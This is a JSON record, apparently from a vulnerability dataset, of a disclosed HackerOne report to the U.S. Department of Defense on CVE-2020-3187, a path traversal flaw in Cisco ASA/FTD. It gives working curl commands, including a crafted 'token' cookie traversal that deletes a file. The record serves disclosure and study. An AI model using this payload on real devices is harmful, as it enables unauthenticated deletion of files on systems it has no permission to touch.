@@ -1,0 +1,38 @@
+{
+  "reported_to": "U.S. Dept Of Defense",
+  "reported_by": "dwisiswant0 ",
+  "title": "Unauthenticated Arbitrary File Deletion (\"CVE-2020-3187\") in \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588",
+  "content": "\nDescription:\nA vulnerability in the interface of Cisco Adaptive Security Appliance (ASA) Software and Cisco Firepower Threat Defense (FTD) Software could allow an unauthenticated, remote attacker to conduct directory traversal attacks and obtain read and delete access to sensitive files.\nVulnerable host:\nhttps://\u2588\u2588\u2588\u2588\u2588\u2588/\nImpact\nAn exploit could allow the attacker to view or delete arbitrary files on the system.\nStep-by-step Reproduction Instructions\n1) Identifying vulnerable host by send request to /+CSCOE+/session_password.html.\nCode 59 Bytes\n1> curl -skiL \"https://\u2588\u2588\u2588\u2588\u2588\u2588/+CSCOE+/session_password.html\"\nCode 94 Bytes\n1GET /+CSCOE+/session_password.html HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\n3User-Agent: curl/7.47.0\n4Accept: */*\n5\nIf the target is vulnerable, the response header will display webvpn header, like:\nCode 196 Bytes\n1HTTP/1.1 200 OK\n2Content-Type: text/plain\n3Content-Length: 0\n4Cache-Control: no-cache\n5Pragma: no-cache\n6Connection: Keep-Alive\n7Date: Thu, 10 Sep 2020 04:14:27 GMT\n8X-Frame-Options: SAMEORIGIN\n9webvpn: \n10\n2) Perform exploits to delete files by adding token in cookie header request.\nFor example, I want to delete this (https://\u2588\u2588\u2588\u2588/+CSCOU+/csco_logo.gif) file.\nCode 241 Bytes\n1> curl -Ik https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/+CSCOU+/csco_logo.gif\n2< HTTP/1.1 200 OK\n3< Content-Type: image/gif\n4< Content-Length: 2678\n5< Cache-Control: max-age=6000\n6< Connection: Keep-Alive\n7< Date: Thu, 10 Sep 2020 04:19:54 GMT\n8< X-Frame-Options: SAMEORIGIN\nRequest:\nCode 109 Bytes\n1> curl -skiL \"https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588/+CSCOE+/session_password.html\" \\\n2  -H \"Cookie: token=../+CSCOU+/csco_logo.gif\" \nCode 133 Bytes\n1GET /+CSCOE+/session_password.html HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\n3Cookie: token=../+CSCOU+/csco_logo.gif\n4User-Agent: curl/7.47.0\n5Accept: */*\n6\nThe following response is shown:\nCode 196 Bytes\n1HTTP/1.1 200 OK\n2Content-Type: text/plain\n3Content-Length: 0\n4Cache-Control: no-cache\n5Pragma: no-cache\n6Connection: Keep-Alive\n7Date: Thu, 10 Sep 2020 04:21:02 GMT\n8X-Frame-Options: SAMEORIGIN\n9webvpn: \n10\nFile deleted successfully:\nCode 209 Bytes\n1> curl -Ik https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/+CSCOU+/csco_logo.gif\n2< HTTP/1.1 404 Not Found\n3< Cache-Control: no-cache\n4< Pragma: no-cache\n5< Connection: Close\n6< Date: Thu, 10 Sep 2020 04:21:20 GMT\n7< X-Frame-Options: SAMEORIGIN\nSuggested Mitigation/Remediation Actions\nhttps://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-path-JE3azWw43\nImpact\nAn exploit could allow the attacker to view or delete arbitrary files on the system.\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Path Traversal"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1601425740,
+  "report_url": "https://hackerone.com/reports/978335",
+  "is_multi_component": false,
+  "complexity": "LOW",
+  "novelty": "LOW",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Identify vulnerable host by sending a request to /+CSCOE+/session_password.html. A vulnerable host will respond with a 'webvpn' header in the response."
+    ],
+    [
+      2,
+      "Perform file deletion by sending a request to the same endpoint with a crafted 'token' cookie containing a directory traversal path to the target file."
+    ]
+  ],
+  "vuln_description": "An unauthenticated directory traversal vulnerability in Cisco ASA and FTD software allows remote attackers to delete arbitrary files by manipulating the 'token' cookie in requests to /+CSCOE+/session_password.html.",
+  "reason": "The vulnerability involves a straightforward directory traversal technique with a single non-obvious component (the 'token' cookie manipulation). No complex application state or novel logic is required.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": true,
+  "is_ctf": false,
+  "other_report": null
+}
